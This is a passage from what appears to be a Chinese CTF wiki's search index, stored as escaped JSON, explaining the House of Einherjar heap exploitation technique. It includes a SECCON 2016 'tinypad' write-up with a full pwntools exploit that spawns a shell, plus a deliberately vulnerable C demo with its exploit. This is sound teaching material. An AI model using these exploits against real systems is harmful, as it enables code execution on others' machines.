\u9644\u8fd1\u6784\u9020\u76f8\u5e94\u7684 fake chunk\uff0c\u4ece\u800c\u7ed5\u8fc7 unlink \u7684\u68c0\u6d4b\u3002\n\n\n\n\n\u5176\u5b9e\uff0c\u8be5\u6280\u672f\u4e0e chunk extend/shrink \u6280\u672f\u6bd4\u8f83\u7c7b\u4f3c\u3002\n\n\n2016 Seccon tinypad\n\n\n\u57fa\u672c\u529f\u80fd\u5206\u6790\n\n\n\u9996\u5148\uff0c\u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u4ee5\u6765\u4e00\u4e2a\u6838\u5fc3\u7684\u8bfb\u53d6\u51fd\u6570\uff0c\u5373\u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u5b57\u8282\u7684\u5b57\u7b26\u4e32\uff0c\u7136\u800c\uff0c\u5f53\u8bfb\u53d6\u7684\u957f\u5ea6\u6070\u597d\u4e3a\u6307\u5b9a\u7684\u957f\u5ea6\u65f6\uff0c\u4f1a\u51fa\u73b0 \noff by one \u7684\u6f0f\u6d1e\n\u3002\n\n\n\u901a\u8fc7\u5206\u6790\u7a0b\u5e8f\uff0c\u6211\u4eec\u4e0d\u96be\u770b\u51fa\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u7684\u57fa\u672c\u529f\u80fd\u662f\u64cd\u4f5c\u4e00\u4e2a tinypad\uff0c\u4e3b\u8981\u6709\u4ee5\u4e0b\u64cd\u4f5c\n\n\n\n\n\u5f00\u5934\uff0c\u7a0b\u5e8f\u6bcf\u6b21\u5f00\u5934\u4f9d\u6b21\u5224\u65ad\u6bcf\u4e2a memo \u7684\u6307\u9488\u6765\u5224\u65ad\u662f\u5426\u4e3a\u7a7a\uff0c\u5982\u679c\u4e0d\u4e3a\u7a7a\uff0c\u8fdb\u800c\u5229\u7528 strlen \u6c42\u5f97\u5176\u76f8\u5e94\u7684\u957f\u5ea6\uff0c\u5c06 memo \u7684\u5185\u5bb9\u8f93\u51fa\u3002\u4ece\u8fd9\u91cc\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u770b\u51fa\u6700\u591a\u6709 4 \u4e2a memo\u3002\n\n\n\u6dfb\u52a0 memo\uff0c\u904d\u5386\u5b58\u50a8 memo \u7684\u53d8\u91cftinypad\uff0c\u6839\u636e tinypad \u7684\u5b58\u50a8\u7684\u5927\u5c0f\u5224\u65ad memo \u662f\u5426\u5728\u4f7f\u7528\uff0c\u7136\u540e\u8fd8\u6709\u7684\u8bdd\uff0c\u5206\u914d\u4e00\u4e2a memo\u3002\u4ece\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\uff0c\u7a0b\u5e8f\u53ea\u662f\u4ece tinypad \u8d77\u59cb\u504f\u79fb16*16=256 \u5904\u624d\u5f00\u59cb\u4f7f\u7528\uff0c\u6bcf\u4e2a memo \u5b58\u50a8\u4e24\u4e2a\u5b57\u6bb5\uff0c\u4e00\u4e2a\u662f\u8be5 memo \u7684\u5927\u5c0f\uff0c\u53e6\u4e00\u4e2a\u662f\u8be5 memo \u5bf9\u5e94\u7684\u6307\u9488\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u7ed3\u6784\u4f53\uff0c\u5e76\u4fee\u6539 ida \u8bc6\u522b\u7684 tinypad\uff0c\u4f7f\u4e4b\u66f4\u52a0\u53ef\u8bfb\uff08\u4f46\u662f\u5176\u5b9e ida \u6ca1\u6709\u529e\u6cd5\u5e2e\u5fd9\u667a\u80fd\u8bc6\u522b\u3002\uff09\u3002\u540c\u65f6\uff0c\u7531\u4e8e\u8be5\u6dfb\u52a0\u529f\u80fd\u4f9d\u8d56\u4e8e\u8bfb\u53d6\u51fd\u6570\uff0c\u6240\u4ee5\u5b58\u5728 off by one \u7684\u6f0f\u6d1e\u3002\u6b64\u5916\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\uff0c\u7528\u6237\u7533\u8bf7\u7684 chunk \u7684\u5927\u5c0f\u6700\u5927\u4e3a 256 \u5b57\u8282\uff0c\u548c tinypad \u524d\u9762\u7684\u672a\u4f7f\u7528\u7684 256 \u5b57\u8282\u6070\u597d\u4e00\u81f4\u3002\n\n\n\u5220\u9664\uff0c\u6839\u636e\u5b58\u50a8 memo \u7684\u5927\u5c0f\u5224\u65ad memo \u662f\u5426\u5728\u88ab\u4f7f\u7528\uff0c\u540c\u65f6\u5c06\u76f8\u5e94 memo \u5927\u5c0f\u8bbe\u7f6e\u4e3a0\uff0c\u4f46\u662f\u5e76\u6ca1\u6709\u5c06\u6307\u9488\u8bbe\u7f6e\u4e3a NULL\uff0c\u6709\u53ef\u80fd\u4f1a\u5bfc\u81f4 Use After Free\u3002\n\u5373\u5728\u7a0b\u5e8f\u5f00\u5934\u65f6\uff0c\u5c31\u6709\u53ef\u80fd\u8f93\u51fa\u4e00\u4e9b\u76f8\u5173\u7684\u5185\u5bb9\uff0c\u8fd9\u5176\u5b9e\u5c31\u662f\u6211\u4eec\u6cc4\u6f0f\u4e00\u4e9b\u57fa\u5730\u5740\u7684\u57fa\u7840\n\u3002\n\n\n\u7f16\u8f91\u3002\u5728\u7f16\u8f91\u65f6\uff0c\u7a0b\u5e8f\u9996\u5148\u6839\u636e\u4e4b\u524d\u5b58\u50a8\u7684 memo \u7684\u5185\u5bb9\u5c06\u5176\u62f7\u8d1d\u5230 tinypad \u7684\u524d 256 \u4e2a\u5b57\u8282\u4e2d\uff0c\u4f46\u6b63\u5982\u6211\u4eec\u4e4b\u524d\u6240\u8bf4\u7684\uff0c\u5f53 memo \u5b58\u50a8\u4e86 256 \u4e2a\u5b57\u8282\u65f6\uff0c\u5c31\u4f1a\u5b58\u5728 off by one\u6f0f\u6d1e\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u7a0b\u5e8f\u5229\u7528 strlen \u5224\u65ad\u590d\u5236\u4e4b\u540e\u7684 tinypad \u7684\u5185\u5bb9\u957f\u5ea6\uff0c\u5e76\u5c06\u5176\u8f93\u51fa\u3002\u4e4b\u540e\u7a0b\u5e8f\u7ee7\u7eed\u5229\u7528 strlen \u6c42\u5f97 memo \u7684\u957f\u5ea6\uff0c\u5e76\u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u5185\u5bb9\u5230 tinypad \u4e2d\uff0c\u6839\u636e\u8bfb\u53d6\u51fd\u6570\uff0c\u8fd9\u91cc\u5fc5\u7136\u51fa\u73b0\u4e86 \n\\x00\n\u3002\u6700\u540e\u7a0b\u5e8f\u5c06\u8bfb\u53d6\u5230 tinypad \u524d 256 \u5b57\u8282\u7684\u5185\u5bb9\u653e\u5230\u5bf9\u5e94 memo \u4e2d\u3002\n\n\n\u9000\u51fa\n\n\n\n\n\u5229\u7528\n\n\n\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b\n\n\n\n\n\u5229\u7528\u5220\u9664\u65f6\u6ca1\u6709\u5c06\u6307\u9488\u7f6e\u4e3aNULL\u7684 UAF \u6f0f\u6d1e\uff0c\u6cc4\u6f0f\u5806\u7684\u57fa\u5730\u5740\n\n\n\u518d\u6b21\u5229\u7528 UAF \u6f0f\u6d1e\u6cc4\u6f0f libc \u7684\u57fa\u5730\u5740\u3002\n\n\n\u5229\u7528 house of einherjar \u65b9\u6cd5\u5728 tinypad \u7684\u524d 256 \u5b57\u8282\u4e2d\u4f2a\u9020 chunk\u3002\u5f53\u6211\u4eec\u518d\u6b21\u7533\u8bf7\u65f6\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u63a7\u52364\u4e2a memo \u7684\u6307\u9488\u548c\u5185\u5bb9\u4e86\u3002\n\n\n\u8fd9\u91cc\u867d\u7136\u6211\u4eec\u7684\u7b2c\u4e00\u60f3\u6cd5\u53ef\u80fd\u662f\u76f4\u63a5\u8986\u76d6 malloc_hook \u4e3a one_gadget \u5730\u5740\uff0c\u4f46\u662f\uff0c\u7531\u4e8e\u5f53\u7f16\u8f91\u65f6\uff0c\u7a0b\u5e8f\u662f\u5229\u7528 strlen \u6765\u5224\u8bfb\u53ef\u4ee5\u8bfb\u53d6\u591a\u5c11\u957f\u5ea6\uff0c\u800c malloc_hook \u5219\u5728\u521d\u59cb\u65f6\u4e3a 0\u3002\u6240\u4ee5\u6211\u4eec\u76f4\u63a5\u8986\u76d6\uff0c\u6240\u4ee5\u8fd9\u91cc\u91c7\u7528\u5176\u4ed6\u65b9\u6cd5\uff0c\u5373\u4fee\u6539\u7a0b\u5e8f\u7684 main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u4e3a one_gadget\uff0c\u4e4b\u6240\u4ee5\u53ef\u4ee5\u884c\u5f97\u901a\uff0c\u662f\u56e0\u4e3a\u8fd4\u56de\u5730\u5740\u5f80\u5f80\u662f 7f \u5f00\u5934\u7684\uff0c\u957f\u5ea6\u8db3\u591f\u957f\uff0c\u53ef\u4ee5\u8986\u76d6\u4e3aone_gadget\u3002\u6240\u4ee5\u6211\u4eec\u8fd8\u662f\u9700\u8981\u6cc4\u6f0f main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\uff0c\u7531\u4e8e libc \u4e2d\u5b58\u50a8\u4e86 main \u51fd\u6570 environ \u6307\u9488\u7684\u5730\u5740\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5148\u6cc4\u9732\u51faenviron \u7684\u5730\u5740\uff0c\u7136\u540e\u5728\u5f97\u77e5\u5b58\u50a8 main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740\u3002\u8fd9\u91cc\u9009\u53d6 environ \u7b26\u53f7\u662f\u56e0\u4e3a environ \u7b26\u53f7\u5728 libc \u4e2d\u4f1a\u5bfc\u51fa\uff0c\u800c\u50cf argc \u548c argv \u5219\u4e0d\u4f1a\u5bfc\u51fa\uff0c\u76f8\u5bf9\u6765\u8bf4\u4f1a\u6bd4\u8f83\u9ebb\u70e6\u4e00\u70b9\u3002\n\n\n\u6700\u540e\u4fee\u6539 main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u4e3a one_gadget \u5730\u5740\u83b7\u53d6shell\u3002\n\n\n\n\n\u5177\u4f53\u5229\u7528\u811a\u672c\u5982\u4e0b\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\ncontext\n.\nterminal\n \n=\n \n[\ngnome-terminal\n,\n \n-x\n,\n \nsh\n,\n \n-c\n]\n\n\nif\n \nargs\n[\nDEBUG\n]:\n\n    \ncontext\n.\nlog_level\n \n=\n \ndebug\n\n\ntinypad\n \n=\n \nELF\n(\n./tinypad\n)\n\n\nif\n \nargs\n[\nREMOTE\n]:\n\n    \np\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n7777\n)\n\n    \nlibc\n \n=\n \nELF\n(\n./libc.so.6\n)\n\n\nelse\n:\n\n    \np\n \n=\n \nprocess\n(\n./tinypad\n)\n\n    \nlibc\n \n=\n \nELF\n(\n./libc.so.6\n)\n\n    \nmain_arena_offset\n \n=\n \n0x3c4b20\n\n\nlog\n.\ninfo\n(\nPID: \n \n+\n \nstr\n(\nproc\n.\npidof\n(\np\n)[\n0\n]))\n\n\n\n\ndef\n \nadd\n(\nsize\n,\n \ncontent\n):\n\n    \np\n.\nrecvuntil\n(\n(CMD)\n \n)\n\n    \np\n.\nsendline\n(\na\n)\n\n    \np\n.\nrecvuntil\n(\n(SIZE)\n \n)\n\n    \np\n.\nsendline\n(\nstr\n(\nsize\n))\n\n    \np\n.\nrecvuntil\n(\n(CONTENT)\n \n)\n\n    \np\n.\nsendline\n(\ncontent\n)\n\n\n\n\ndef\n \nedit\n(\nidx\n,\n \ncontent\n):\n\n    \np\n.\nrecvuntil\n(\n(CMD)\n \n)\n\n    \np\n.\nsendline\n(\ne\n)\n\n    \np\n.\nrecvuntil\n(\n(INDEX)\n \n)\n\n    \np\n.\nsendline\n(\nstr\n(\nidx\n))\n\n    \np\n.\nrecvuntil\n(\n(CONTENT)\n \n)\n\n    \np\n.\nsendline\n(\ncontent\n)\n\n    \np\n.\nrecvuntil\n(\nIs it OK?\n\\n\n)\n\n    \np\n.\nsendline\n(\nY\n)\n\n\n\n\ndef\n \ndelete\n(\nidx\n):\n\n    \np\n.\nrecvuntil\n(\n(CMD)\n \n)\n\n    \np\n.\nsendline\n(\nd\n)\n\n    \np\n.\nrecvuntil\n(\n(INDEX)\n \n)\n\n    \np\n.\nsendline\n(\nstr\n(\nidx\n))\n\n\n\n\ndef\n \nrun\n():\n\n    \np\n.\nrecvuntil\n(\n\n        \n  ============================================================================\n\\n\\n\n\n    \n)\n\n    \n# 1. leak heap base\n\n    \nadd\n(\n0x70\n,\n \na\n \n*\n \n8\n)\n  \n# idx 0\n\n    \nadd\n(\n0x70\n,\n \nb\n \n*\n \n8\n)\n  \n# idx 1\n\n    \nadd\n(\n0x100\n,\n \nc\n \n*\n \n8\n)\n  \n# idx 2\n\n\n    \ndelete\n(\n2\n)\n  \n# delete idx 1\n\n    \ndelete\n(\n1\n)\n  \n# delete idx 0, idx 0 point to idx 1\n\n    \np\n.\nrecvuntil\n(\n # CONTENT: \n)\n\n    \ndata\n \n=\n \np\n.\nrecvuntil\n(\n\\n\n,\n \ndrop\n=\nTrue\n)\n  \n# get pointer point to idx1\n\n    \nheap_base\n \n=\n \nu64\n(\ndata\n.\nljust\n(\n8\n,\n \n\\x00\n))\n \n-\n \n0x80\n\n    \nlog\n.\nsuccess\n(\nget heap base: \n \n+\n \nhex\n(\nheap_base\n))\n\n\n    \n# 2. leak libc base\n\n    \n# this will trigger malloc_consolidate\n\n    \n# first idx0 will go to unsorted bin\n\n    \n# second idx1 will merge with idx0(unlink), and point to idx0\n\n    \n# third idx1 will merge into top chunk\n\n    \n# but cause unlink feture, the idx0\ns fd and bk won\nt change\n\n    \n# so idx0 will leak the unsorted bin addr\n\n    \ndelete\n(\n3\n)\n\n    \np\n.\nrecvuntil\n(\n # CONTENT: \n)\n\n    \ndata\n \n=\n \np\n.\nrecvuntil\n(\n\\n\n,\n \ndrop\n=\nTrue\n)\n\n    \nunsorted_offset_arena\n \n=\n \n8\n \n+\n \n10\n \n*\n \n8\n\n    \nmain_arena\n \n=\n \nu64\n(\ndata\n.\nljust\n(\n8\n,\n \n\\x00\n))\n \n-\n \nunsorted_offset_arena\n\n    \nlibc_base\n \n=\n \nmain_arena\n \n-\n \nmain_arena_offset\n\n    \nlog\n.\nsuccess\n(\nmain arena addr: \n \n+\n \nhex\n(\nmain_arena\n))\n\n    \nlog\n.\nsuccess\n(\nlibc base addr: \n \n+\n \nhex\n(\nlibc_base\n))\n\n\n    \n# 3. house of einherjar\n\n    \nadd\n(\n0x18\n,\n \na\n \n*\n \n0x18\n)\n  \n# idx 0\n\n    \n# we would like trigger house of einherjar at idx 1\n\n    \nadd\n(\n0x100\n,\n \nb\n \n*\n \n0xf8\n \n+\n \n\\x11\n)\n  \n# idx 1\n\n    \nadd\n(\n0x100\n,\n \nc\n \n*\n \n0xf8\n)\n  \n# idx 2\n\n    \nadd\n(\n0x100\n,\n \nd\n \n*\n \n0xf8\n)\n  \n#idx 3\n\n\n    \n# create a fake chunk in tinypad\ns 0x100 buffer, offset 0x20\n\n    \ntinypad_addr\n \n=\n \n0x602040\n\n    \nfakechunk_addr\n \n=\n \ntinypad_addr\n \n+\n \n0x20\n\n    \nfakechunk_size\n \n=\n \n0x101\n\n    \nfakechunk\n \n=\n \np64\n(\n0\n)\n \n+\n \np64\n(\nfakechunk_size\n)\n \n+\n \np64\n(\nfakechunk_addr\n)\n \n+\n \np64\n(\n\n        \nfakechunk_addr\n)\n\n    \nedit\n(\n3\n,\n \nd\n \n*\n \n0x20\n \n+\n \nfakechunk\n)\n\n\n    \n# overwrite idx 1\ns prev_size and\n\n    \n# set minaddr of size to \n\\x00\n\n    \n# idx 0\ns chunk size is 0x20\n\n    \ndiff\n \n=\n \nheap_base\n \n+\n \n0x20\n \n-\n \nfakechunk_addr\n\n    \nlog\n.\ninfo\n(\ndiff between idx1 and fakechunk: \n \n+\n \nhex\n(\ndiff\n))\n\n    \n# \n\\0\n padding caused by strcpy\n\n    \ndiff_strip\n \n=\n \np64\n(\ndiff\n)\n.\nstrip\n(\n\\0\n)\n\n    \nnumber_of_zeros\n \n=\n \nlen\n(\np64\n(\ndiff\n))\n \n-\n \nlen\n(\ndiff_strip\n)\n\n    \nfor\n \ni\n \nin\n \nrange\n(\nnumber_of_zeros\n \n+\n \n1\n):\n\n        \ndata\n \n=\n \ndiff_strip\n.\nrjust\n(\n0x18\n \n-\n \ni\n,\n \nf\n)\n\n        \nedit\n(\n1\n,\n \ndata\n)\n\n    \ndelete\n(\n2\n)\n\n    \np\n.\nrecvuntil\n(\n\\n\nDeleted.\n)\n\n\n    \n# fix the fake chunk size, fd and bk\n\n    \n# fd and bk must be unsorted bin\n\n    \nedit\n(\n4\n,\n \nd\n \n*\n \n0x20\n \n+\n \np64\n(\n0\n)\n \n+\n \np64\n(\n0x101\n)\n \n+\n \np64\n(\nmain_arena\n \n+\n \n88\n)\n \n+\n\n         \np64\n(\nmain_arena\n \n+\n \n88\n))\n\n\n    \n# 3. overwrite malloc_hook with one_gadget\n\n\n    \none_gadget_addr\n \n=\n \nlibc_base\n \n+\n \n0x45216\n\n    \nenviron_pointer\n \n=\n \nlibc_base\n \n+\n \nlibc\n.\nsymbols\n[\n__environ\n]\n\n    \nlog\n.\ninfo\n(\none gadget addr: \n \n+\n \nhex\n(\none_gadget_addr\n))\n\n    \nlog\n.\ninfo\n(\nenviron pointer addr: \n \n+\n \nhex\n(\nenviron_pointer\n))\n\n    \n#fake_malloc_chunk = main_arena - 60 + 9\n\n    \n# set memo[0].size = \na\n*8,\n\n    \n# set memo[0].content point to environ to leak environ addr\n\n    \nfake_pad\n \n=\n \nf\n \n*\n \n(\n0x100\n \n-\n \n0x20\n \n-\n \n0x10\n)\n \n+\n \na\n \n*\n \n8\n \n+\n \np64\n(\n\n        \nenviron_pointer\n)\n \n+\n \na\n \n*\n \n8\n \n+\n \np64\n(\n0x602148\n)\n\n    \n# get a fake chunk\n\n    \nadd\n(\n0x100\n \n-\n \n8\n,\n \nfake_pad\n)\n  \n# idx 2\n\n    \n#gdb.attach(p)\n\n\n    \n# get environ addr\n\n    \np\n.\nrecvuntil\n(\n # CONTENT: \n)\n\n    \nenviron_addr\n \n=\n \np\n.\nrecvuntil\n(\n\\n\n,\n \ndrop\n=\nTrue\n)\n.\nljust\n(\n8\n,\n \n\\x00\n)\n\n    \nenviron_addr\n \n=\n \nu64\n(\nenviron_addr\n)\n\n    \nmain_ret_addr\n \n=\n \nenviron_addr\n \n-\n \n30\n \n*\n \n8\n\n\n    \n# set memo[0].content point to main_ret_addr\n\n    \nedit\n(\n2\n,\n \np64\n(\nmain_ret_addr\n))\n\n    \n# overwrite main_ret_addr with one_gadget addr\n\n    \nedit\n(\n1\n,\n \np64\n(\none_gadget_addr\n))\n\n    \np\n.\ninteractive\n()\n\n\n\n\nif\n \n__name__\n \n==\n \n__main__\n:\n\n    \nrun\n()\n\n\n\n\n\n\u53c2\u8003\u6587\u732e\n\n\n\n\nhttps://www.slideshare.net/codeblue_jp/cb16-matsukuma-en-68459606\n\n\nhttps://gist.github.com/hhc0null/4424a2a19a60c7f44e543e32190aaabf", 
            "title": "House Of Einherjar"
        }, 
        {
            "location": "/pwn/heap/house_of_einherjar/#house-of-einherjar", 
            "text": "", 
            "title": "House Of Einherjar"
        }, 
        {
            "location": "/pwn/heap/house_of_einherjar/#_1", 
            "text": "house of einherjar \u662f\u4e00\u79cd\u5806\u5229\u7528\u6280\u672f\uff0c\u7531  Hiroki Matsukuma  \u63d0\u51fa\u3002\u8be5\u5806\u5229\u7528\u6280\u672f\u53ef\u4ee5\u5f3a\u5236\u4f7f\u5f97  malloc  \u8fd4\u56de\u4e00\u4e2a\u51e0\u4e4e\u4efb\u610f\u5730\u5740\u7684 chunk \u3002\u5176\u4e3b\u8981\u5728\u4e8e\u6ee5\u7528  free  \u4e2d\u7684\u540e\u5411\u5408\u5e76\u64cd\u4f5c\uff08\u5408\u5e76\u4f4e\u5730\u5740\u7684chunk\uff09\uff0c\u4ece\u800c\u4f7f\u5f97\u5c3d\u53ef\u80fd\u907f\u514d\u788e\u7247\u5316\u3002  \u6b64\u5916\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u4e00\u4e9b\u7279\u6b8a\u5927\u5c0f\u7684\u5806\u5757\u4e2d\uff0coff by one \u4e0d\u4ec5\u53ef\u4ee5\u4fee\u6539\u4e0b\u4e00\u4e2a\u5806\u5757\u7684 prev_size\uff0c\u8fd8\u53ef\u4ee5\u4fee\u6539\u4e0b\u4e00\u4e2a\u5806\u5757\u7684 PREV_INUSE \u6bd4\u7279\u4f4d\u3002", 
            "title": "\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/heap/house_of_einherjar/#_2", 
            "text": "", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/heap/house_of_einherjar/#_3", 
            "text": "free  \u51fd\u6570\u4e2d\u7684\u540e\u5411\u5408\u5e76\u6838\u5fc3\u64cd\u4f5c\u5982\u4e0b           /* consolidate backward */ \n         if   ( ! prev_inuse ( p ))   { \n             prevsize   =   prev_size ( p ); \n             size   +=   prevsize ; \n             p   =   chunk_at_offset ( p ,   - (( long )   prevsize )); \n             unlink ( av ,   p ,   bck ,   fwd ); \n         }   \u8fd9\u91cc\u501f\u7528\u539f\u4f5c\u8005\u7684\u4e00\u5f20\u56fe\u7247\u8bf4\u660e   \u5173\u4e8e\u6574\u4f53\u7684\u64cd\u4f5c\uff0c\u8bf7\u53c2\u8003  \u6df1\u5165\u7406\u89e3\u5806\u7684\u5b9e\u73b0  \u90a3\u4e00\u7ae0\u8282\u3002", 
            "title": "\u540e\u5411\u5408\u5e76\u64cd\u4f5c"
        }, 
        {
            "location": "/pwn/heap/house_of_einherjar/#_4", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u5c31\u4ecb\u7ecd\u8be5\u5229\u7528\u7684\u539f\u7406\u3002\u9996\u5148\uff0c\u5728\u4e4b\u524d\u7684\u5806\u7684\u4ecb\u7ecd\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053\u4ee5\u4e0b\u7684\u77e5\u8bc6   \u4e24\u4e2a\u7269\u7406\u76f8\u90bb\u7684 chunk \u4f1a\u5171\u4eab  prev_size \u5b57\u6bb5\uff0c\u5c24\u5176\u662f\u5f53\u4f4e\u5730\u5740\u7684 chunk \u5904\u4e8e\u4f7f\u7528\u72b6\u6001\u65f6\uff0c\u9ad8\u5730\u5740\u7684chunk\u7684\u8be5\u5b57\u6bb5\u4fbf\u53ef\u4ee5\u88ab\u4f4e\u5730\u5740\u7684 chunk \u4f7f\u7528\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u6709\u5e0c\u671b\u53ef\u4ee5\u901a\u8fc7\u5199\u4f4e\u5730\u5740 chunk \u8986\u76d6\u9ad8\u5730\u5740 chunk \u7684  prev_size  \u5b57\u6bb5\u3002  \u4e00\u4e2a chunk PREV_INUSE \u4f4d\u6807\u8bb0\u4e86\u5176\u7269\u7406\u76f8\u90bb\u7684\u4f4e\u5730\u5740 chunk \u7684\u4f7f\u7528\u72b6\u6001\uff0c\u800c\u4e14\u8be5\u4f4d\u662f\u548c prev_size \u7269\u7406\u76f8\u90bb\u7684\u3002  \u540e\u5411\u5408\u5e76\u65f6\uff0c\u65b0\u7684 chunk \u7684\u4f4d\u7f6e\u53d6\u51b3\u4e8e  chunk_at_offset(p, -((long) prevsize))  \u3002   \u90a3\u4e48\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u540c\u65f6\u63a7\u5236\u4e00\u4e2achunk prev_size \u4e0e PREV_INUSE \u5b57\u6bb5\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u5c06\u65b0\u7684 chunk \u6307\u5411\u51e0\u4e4e\u4efb\u4f55\u4f4d\u7f6e\u3002", 
            "title": "\u5229\u7528\u539f\u7406"
        }, 
        {
            "location": "/pwn/heap/house_of_einherjar/#_5", 
            "text": "", 
            "title": "\u5229\u7528\u8fc7\u7a0b"
        }, 
        {
            "location": "/pwn/heap/house_of_einherjar/#_6", 
            "text": "\u5047\u8bbe\u6ea2\u51fa\u524d\u7684\u72b6\u6001\u5982\u4e0b", 
            "title": "\u6ea2\u51fa\u524d"
        }, 
        {
            "location": "/pwn/heap/house_of_einherjar/#_7", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u5047\u8bbe p0 \u5806\u5757\u4e00\u65b9\u9762\u53ef\u4ee5\u5199prev_size\u5b57\u6bb5\uff0c\u53e6\u4e00\u65b9\u9762\uff0c\u5b58\u5728off by one\u7684\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u5199\u4e0b\u4e00\u4e2a chunk \u7684PREV_INUSE \u90e8\u5206\uff0c\u90a3\u4e48", 
            "title": "\u6ea2\u51fa"
        }, 
        {
            "location": "/pwn/heap/house_of_einherjar/#_8", 
            "text": "\u5047\u8bbe\u6211\u4eec\u5c06 p1\u7684 prev_size \u5b57\u6bb5\u8bbe\u7f6e\u4e3a\u6211\u4eec\u60f3\u8981\u7684\u76ee\u7684 chunk \u4f4d\u7f6e\u4e0ep1\u7684\u5dee\u503c \u3002\u5728\u6ea2\u51fa\u540e\uff0c\u6211\u4eec\u91ca\u653ep1\uff0c\u5219\u6211\u4eec\u6240\u5f97\u5230\u7684\u65b0\u7684 chunk \u7684\u4f4d\u7f6e  chunk_at_offset(p1, -((long) prevsize))  \u5c31\u662f\u6211\u4eec\u60f3\u8981\u7684 chunk \u4f4d\u7f6e\u4e86\u3002  \u5f53\u7136\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u7531\u4e8e\u8fd9\u91cc\u4f1a\u5bf9\u65b0\u7684 chunk \u8fdb\u884c unlink \uff0c\u56e0\u6b64\u9700\u8981\u786e\u4fdd\u5728\u5bf9\u5e94 chunk \u4f4d\u7f6e\u6784\u9020\u597d\u4e86fake chunk \u4ee5\u4fbf\u4e8e\u7ed5\u8fc7 unlink \u7684\u68c0\u6d4b\u3002", 
            "title": "\u6ea2\u51fa\u540e"
        }, 
        {
            "location": "/pwn/heap/house_of_einherjar/#_9", 
            "text": "\u53ef\u4ee5\u8fdb\u884c House Of Einherjar \u653b\u51fb\u7684\u4ee3\u7801\uff1a  #include   stdio.h  #include   stdlib.h  #include   unistd.h  int   main ( void ){ \n     char *   s0   =   malloc ( 0x200 ); \u3000 //\u6784\u9020fake chunk \n     char *   s1   =   malloc ( 0x18 );  \n     char *   s2   =   malloc ( 0xf0 ); \u3000 \n     char *   s3   =   malloc ( 0x20 );   //\u4e3a\u4e86\u4e0d\u8ba9s2\u4e0etop chunk \u5408\u5e76 \n     printf ( begin \\n );  \n     printf ( %p \\n ,   s0 ); \n     printf ( input s0 \\n ); \n     read ( 0 ,   s0 ,   0x200 );   //\u8bfb\u5165fake chunk \n     printf ( input s1 \\n ); \n     read ( 0 ,   s1 ,   0x19 );   //Off By One \n     free ( s2 ); \n     return   0 ;  }   \u653b\u51fb\u4ee3\u7801\u5982\u4e0b\uff1a  from   pwn   import   *  p   =   process ( ./example )  context . log_level   =   debug  #gdb.attach(p)  p . recvuntil ( begin \\n )  address   =   int ( p . recvline () . strip (),   16 )  p . recvuntil ( input s0 \\n )  payload   =   p64 ( 0 )   +   p64 ( 0x101 )   +   p64 ( address )   *   2   +   A * 0xe0   p64(address) * 2\u662f\u4e3a\u4e86\u7ed5\u8fc7  if (__builtin_expect (FD- bk != P || BK- fd != P, 0))                      \\    malloc_printerr ( corrupted double-linked list );     payload   +=   p64 ( 0x100 )   #fake size  p . sendline ( payload )  p . recvuntil ( input s1 \\n )  payload   =   A * 0x10   +   p64 ( 0x220 )   +   \\x00  p . sendline ( payload )  p . recvall ()  p . close ()   \u6ce8\u610f\u8fd9\u91cc\u7ed5\u8fc7unlink\u68c0\u67e5\u7684\u65b9\u6cd5\u8ddf\u4e4b\u524d\u5229\u7528unlink\u6f0f\u6d1e\u65f6\u91c7\u7528\u7684\u65b9\u6cd5\u4e0d\u4e00\u6837  \u5229\u7528unlink\u6f0f\u6d1e\u7684\u65f6\u5019\uff1a    p - fd   =   p - 3 * 4 \n  p - bk   =   p - 2 * 4   \u5728\u8fd9\u91cc\u5229\u7528\u65f6\uff0c\u56e0\u4e3a\u6ca1\u6709\u529e\u6cd5\u627e\u5230  p   ,\u6240\u4ee5\u76f4\u63a5\u8ba9\uff1a  p - fd   =   p  p - bk   =   p   \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u4e00\u4e2a\u70b9\uff1a  payload   =   p64 ( 0 )   +   p64 ( 0x101 )   +   p64 ( address )   *   2   +   A * 0xe0   \u5176\u5b9e\u4fee\u6539\u4e3a\u4e0b\u9762\u8fd9\u6837\u4e5f\u662f\u53ef\u4ee5\u7684:  payload   =   p64 ( 0 )   +   p64 ( 0x221 )   +   p64 ( address )   *   2   +   A * 0xe0   \u6309\u7167\u9053\u7406\u6765\u8bb2 fake chunk \u7684 size \u662f  0x221   \u624d\u5408\u7406\uff0c\u4f46\u662f\u4e3a\u4ec0\u4e48   0x101  \u4e5f\u53ef\u4ee5\u5462\uff1f\u8fd9\u662f\u56e0\u4e3a\u5bf9 size \u548c prev_size \u7684\u9a8c\u8bc1\u53ea\u53d1\u751f\u5728 unlink \u91cc\u9762\uff0c\u800c unlink \u91cc\u9762\u662f\u8fd9\u6837\u9a8c\u8bc1\u7684:  if   ( __builtin_expect   ( chunksize ( P )   !=   prev_size  